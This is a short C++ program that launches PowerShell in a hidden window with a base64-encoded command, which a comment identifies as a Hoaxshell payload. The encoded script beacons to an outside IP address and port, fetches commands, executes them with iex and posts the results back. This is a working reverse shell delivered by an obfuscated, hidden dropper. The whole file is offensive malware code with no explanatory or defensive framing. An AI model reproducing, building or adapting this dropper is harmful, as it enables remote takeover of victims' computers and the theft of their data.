#include <windows.h>
#include <shellapi.h>
#include <string>

int main() {
    // but your custom encoded (base64) Hoaxshell command
    std::string encodedCommand = "JABQAD0AJwBoAHQAdABwADoALwAvACcAOwAkAFMAPQAnADEANgAuADEANwAwAC4AMgAzADUALgAyADAANAA6ADUAMAAwADUAMAAnADsAJABJAD0AJwA4ADAAMgA3ADcAOQA2ADAALQA3ADcANABkADAAZQBlAGYALQAzAGEAMwA2ADYAOQAyADQAJwA7ACQAdgA9AEkAVwBSACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAiACQAUAAkAFMALwA4ADAAMgA3ADcAOQA2ADAAIgAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAnAFgALQA1ADcAYgAyAC0AOQBkADUAYgAnAD0AJABJAH0AOwB3AGgAaQBsAGUAKAAkAHQAcgB1AGUAKQB7ACQAQwA9ACgASQBXAFIAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACIAJABQACQAUwAvADcANwA0AGQAMABlAGUAZgAiACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACcAWAAtADUANwBiADIALQA5AGQANQBiACcAPQAkAEkAfQApAC4AQwBvAG4AdABlAG4AdAA7AGkAZgAoACQAQwAtAG4AZQAnAE4AbwBuAGUAJwApAHsAJABSAD0AaQBlAHgAIAAkAEMAIAAtAEUAYQAgADAAIAAtAEUAVgAgAGUAOwAkAFIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAAgACQAUgA7ACQAVAA9AEkAVwBSACAALQBVAHIAaQAgACIAJABQACQAUwAvADMAYQAzADYANgA5ADIANAAiACAALQBNAGUAdABoAG8AZAAgAFAATwBTAFQAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAJwBYAC0ANQA3AGIAMgAtADkAZAA1AGIAJwA9ACQASQB9ACAALQBCAG8AZAB5ACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGUAKwAkAFIAKQAtAGoAbwBpAG4AJwAgACcAKQB9AFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AcwAgADAALgA4AH0A";

    std::string encodedCommandWithParams = "-EncodedCommand " + encodedCommand;

    // Convert the command to wide string
    std::wstring wideCommand = std::wstring(encodedCommandWithParams.begin(), encodedCommandWithParams.end());
    LPCWSTR lpCommand = wideCommand.c_str();

    // Execute the command using ShellExecute with SW_HIDE flag
    ShellExecute(NULL, L"open", L"powershell.exe", lpCommand, NULL, SW_HIDE);

    return 0;
}
